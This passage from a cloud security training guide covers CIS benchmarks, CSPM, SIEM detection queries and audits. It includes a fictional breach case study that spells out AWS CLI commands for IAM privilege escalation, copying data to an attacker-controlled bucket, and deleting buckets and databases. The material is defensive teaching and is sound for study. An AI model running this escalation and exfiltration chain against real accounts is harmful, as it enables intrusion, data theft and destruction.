| 4.5 | Ensure VPC flow logging is enabled in all VPCs | Scored | ❌ FAIL (3 VPCs) |

**CIS Kubernetes Benchmark (mock excerpt):**
```
1.1.1 Ensure that the API server pod specification file permissions are set to 644 or more restrictive
      → FAIL on worker-node-01
1.2.1 Ensure that the --anonymous-auth argument is set to false
      → FAIL on control-plane-01
2.1.1 Ensure that the kubelet service file permissions are set to 644 or more restrictive
      → PASS
```

## 13.2 CSPM Tools

**CSPM** = Cloud Security Posture Management — continuously assesses configurations against frameworks.

| Provider-native | Third-party |
|---|---|
| AWS Security Hub + Config + GuardDuty + Access Analyzer | Prisma Cloud, Wiz, Orca, CrowdStrike |
| Microsoft Defender for Cloud | Tenable, Qualys, Rapid7 |
| Google Security Command Center | Datadog Cloud Security |

## 13.3 Cloud Posture Management Workflow

```
Cloud accounts → (Collector agents / APIs) → Continuous assessment
     → Policies (CIS, NIST, custom)
     → Findings (risk-scored)
     → Remediation (auto or manual)
     → Reporting (dashboards, compliance evidence)
```

**Mock CSPM finding:**
```
finding_id: f-2026-0812-0033
framework:  CIS AWS 3.0 / section 2.1.1
resource:   aws_s3_bucket.mock-customer-data (us-east-1)
risk_score: 90 / 100 (Critical)
description: Bucket has public-read ACL and no Block Public Access.
recommendation: Enable Block Public Access and remove public ACL.
status: OPEN (auto-remediation DRY_RUN)
```

## 13.4 SIEM Integration

**Every cloud action should end up in your SIEM.** Typical pipeline:

```
CloudTrail / Activity Logs / Flow Logs
        │
        ▼
Log aggregation (S3 / EventHub / PubSub)
        │
        ▼
SIEM (Sentinel / Splunk / Elastic)
        │
        ▼
Detection rules → Alerts → SOAR → Incident response
```

**Useful detection queries (mock):**
```
# Sentinel KQL — new user granted owner/contributor
IdentityInfo
| where TimeGenerated > ago(1d)
| where OperationName == "Add member to role"
| where RoleName in ("Owner", "Contributor")

# Splunk — EC2 instances launched by non-standard user
index=cloudtrail action=RunInstances
| search NOT user_name IN (deploy-svc, sre-oncall)
| table _time, user_name, sourceIPAddress, eventName
```

## 13.5 Cloud Security Audit

A structured audit covers:

1. **Identity:** unused accounts, dormant keys, MFA coverage, privileged role holders.
2. **Network:** open ports, missing VPC/flow logs, public IPs, peerings.
3. **Data:** unencrypted storage, public buckets, lifecycle policies.
4. **Logging:** trails/enabled, retention, log integrity validation.
5. **IaaS/containers:** patch level, CIS score, runtime vulnerabilities.
6. **Compliance evidence:** SOC 2/ISO attestations, retention of evidence.

**Mock audit scorecard:**

| Domain | Score | Key Gap |
|---|---|---|
| Identity & Access | 82% | 6 users without MFA |
| Network Security | 91% | 2 open ports (443 intended, 22 misconfig) |
| Data Protection | 74% | 1 unencrypted bucket |
| Logging & Monitoring | 68% | No data events on 4 buckets |
| Compliance evidence | 88% | Attestations current |

---

# 14. Mock Cloud Breach Case Study

> **Fully fictional.** Company, people, IPs, and account IDs are invented for training.

## 14.1 Scenario Overview

- **Victim (fictional):** "NimbusRetail" — a mid-size e-commerce retailer running on AWS (eu-west-1).
- **Stack:** S3 (customer order exports), EC2 (web + app), RDS MySQL, IAM roles, CloudTrail.
- **Attacker (fictional):** opportunistic group "F3n1x" with known TTPs for misconfigured S3.
- **Timeline:** exposure 41 days; full data exfiltration; ransomware-adjacent destruction attempt **stopped** by logs.

## 14.2 Attack Chain Walkthrough

### Stage 1 — Reconnaissance: Misconfigured S3

Attacker scanned public bucket policies (Shodan/Internet-wide enumeration). Found:

```
GET https://exports.nimbusretail-fictional.example/orders/2026/07/07.json
HTTP/1.1 200 OK
```
Bucket policy allowed anonymous `s3:GetObject` on prefix `orders/`.

**Mock attacker log (fictional):**
```
[F3n1x] bucket 'nimbusretail-exports-fictional' is wide open (read-only).
[F3n1x] pulling listing of prefix 'config/' ... contains 'app-config.json'
```

### Stage 2 — Credential Leak

The attacker downloaded `config/app-config.json` which contained a hardcoded **IAM access key** committed by a developer in a moment of laziness:

```json
{
  "s3": { "bucket": "nimbusretail-exports-fictional" },
  "rds": { "host": "nimbus-rds.cluster-fictional.eu-west-1.rds.amazonaws.com" },
  "aws_credentials": {
    "aws_access_key_id": "AKIAEXAMPLE4X7Q9",
    "aws_secret_access_key": "wJalrXUtnFEMI/EXAMPLEONLY8K7MDENG/bPxRfiCYzKEY"
  }
}
```

### Stage 3 — IAM Escalation

The leaked key belonged to a role with **`iam:AttachUserPolicy` + `iam:CreateUser`** (a "temporary admin shortcut"). Attacker escalated:

```bash
aws iam create-user --user-name backup-relay-service
aws iam attach-user-policy --user-name backup-relay-service \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam create-access-key --user-name backup-relay-service
```

**Mock response:**
```
"AccessKeyId": "AKIAESCALATED0001"
```

### Stage 4 — Data Exfiltration

With admin rights, the attacker enumerated and copied:

```bash
aws s3 sync s3://nimbusretail-exports-fictional /tmp/exfil --exclude '*.log'
aws rds describe-db-instances --region eu-west-1
aws rds create-db-snapshot --db-instance-identifier nimbus-rds \
  --db-snapshot-identifier leaked-snapshot-aug-2026
aws s3 cp /tmp/exfil s3://fnx-staging-bucket-8821/ --recursive
```

**Mock CloudTrail entries (the smoking gun):**
```
| user: backup-relay-service | event: CreateAccessKey   | time: 2026-08-02T03:14:00Z |
| user: backup-relay-service | event: s3:GetObject (config/app-config.json) |
| user: backup-relay-service | event: CreateDbSnapshot  | time: 2026-08-02T03:40:00Z |
| user: backup-relay-service | event: s3:PutObject (10.4 GB egress) |
```

### Stage 5 — Attempted Destruction (Foiled)

Attacker tried to delete buckets and the RDS instance. **The root cause of failure:** CloudTrail **was** enabled (a rare saving grace), an anomaly-detection rule flagged the 10.4 GB egress, and the on-call engineer froze the account within 12 minutes.

```bash
aws s3 rb s3://nimbusretail-exports-fictional --force   # ❌ AccessDenied (frozen)
aws rds delete-db-instance --db-instance-identifier nimbus-rds  # ❌ AccessDenied
```

## 14.3 Detection Timeline

| Time (UTC) | Event | Source |
|---|---|---|
| 2026-06-23 | Anonymous read of `orders/` prefix starts | S3 access logs |
| 2026-08-02 03:14 | IAM escalation (CreateUser + AttachUserPolicy) | CloudTrail |
| 2026-08-02 03:40 | DB snapshot created + downloaded | CloudTrail |
| 2026-08-02 04:02 | 10.4 GB egress anomaly → **alert** | GuardDuty + custom SIEM rule |
| 2026-08-02 04:14 | Account frozen; keys revoked | Incident response |
| 2026-08-04 | Forensics complete; root cause documented | DFIR |

**Why it took 41 days to find the S3 exposure but 12 minutes to stop the escalation:** monitoring was configured for *unusual volume*, not for *public access* — a posture gap (CIS 2.1.1 wasn't enforced).

## 14.4 Defense Recommendations (Post-Incident)

### Immediate
- [x] **Revoke and rotate all keys** exposed in the config.
- [x] Remove `iam:CreateUser`/`AttachUserPolicy` from all non-privileged roles.
- [x] Enable **S3 Block Public Access** org-wide.
- [x] Restore data from clean snapshots; verify integrity.

### Structural
- [x] Enforce **least privilege via SCPs** (deny IAM mutation except from break-glass).
- [x] **No secrets in S3 config**; use AWS Secrets Manager + KMS.
- [x] **CloudTrail + GuardDuty + Access Analyzer** with SIEM alerting org-wide.
- [x] **S3 access analyzer** to auto-alert on external access.
- [x] **Dormant key / unused identity hygiene** (90-day key rotation).

### Process
- [x] **IaC scanning** (Checkov/tfsec) blocks `public-read` in CI.
- [x] **Blast-radius isolation:** egress egress filtering; data loss prevention alerts on high-volume `s3:GetObject`/`PutObject`.
- [x] **Tabletop exercise** repeating this chain quarterly.
- [x] **Incident runbook** with freeze-and-recover playbook < 30 min.

## 14.5 Lessons Learned

1. **Misconfiguration is the attack surface** — automation (CSPM/IaC scan) is the only scalable defense.
2. **One leaked key can become admin** if roles are over-permissioned — least privilege is non-negotiable.
3. **Logs save you** — CloudTrail + anomaly detection converted a full wipe into a contained incident.
4. **Secrets-in-code is a hard failure** — pre-commit hooks (`gitleaks`) and vaults are mandatory.
5. **Detection beats prevention** — assume breach, engineer for detection and rapid response.

---

# Appendix A — Quick Command Cheat Sheet

| Task | Command |
|---|---|
| List public S3 buckets | `aws s3api list-buckets; aws s3api get-bucket-policy-status --bucket $b` |
| Block public access account-wide | `aws s3control put-public-access-block --account-id 123456789012 --public-access-block-configuration BlockPublicAcls=true,...` |
| Check CloudTrail trails | `aws cloudtrail describe-trails` |
| Enforce IMDSv2 | `aws ec2 modify-instance-metadata-options --http-tokens required --instance-id i-xxx` |
| Azure: view role assignments | `az role assignment list --assignee user@fictionalcorp.onmicrosoft.com` |
| Azure: list open NSGs | `az network nsg list --query "[?securityRules[?access=='Allow' && sourceAddressPrefixes[?contains(@,'0.0.0.0/0')]]]"` |
| GCP: find allUsers bindings | `gcloud projects get-iam-policy PROJECT --format json | jq '.bindings[] | select(.members[] == "allUsers")'` |
| Scan image | `trivy image --severity CRITICAL,HIGH IMAGE` |
| K8s default-deny | `kubectl apply -f default-deny-all.yaml` |
| Detect privileged pods | `kubectl get pods -A -o jsonpath='{range .items[*]}{.metadata.name}{" "}{.spec.containers[].securityContext.privileged}{"\n"}{end}'` |
| Sign image | `cosign sign ghcr.io/mockcorp/app:v1.2.0` |
| IaC scan | `checkov -d . && tfsec .` |
| Secret scan | `gitleaks detect --source .` |

---

# Appendix B — Key Terms Glossary

| Term | Definition |
|---|---|
| **IAM** | Identity and Access Management |
| **CSPM** | Cloud Security Posture Management |
| **CA / Conditional Access** | Policy engine gating sign-in by conditions |
| **RBAC** | Role-Based Access Control |
| **SAST / SCA** | Static Application Security Testing / Software Composition Analysis |
| **SBOM** | Software Bill of Materials |
| **SLSA** | Supply-chain Levels for Software Artifacts |
| **PSA** | Pod Security Admission |
| **IaC** | Infrastructure as Code |
| **CVE** | Common Vulnerabilities and Exposures |
| **SOC2 / ISO 27001** | Common compliance frameworks for cloud providers |
| **etcd** | Kubernetes' distributed key-value store of cluster state |

---

*End of document. All identifiers, credentials, IPs, and incident stories are fictional and for training only.*
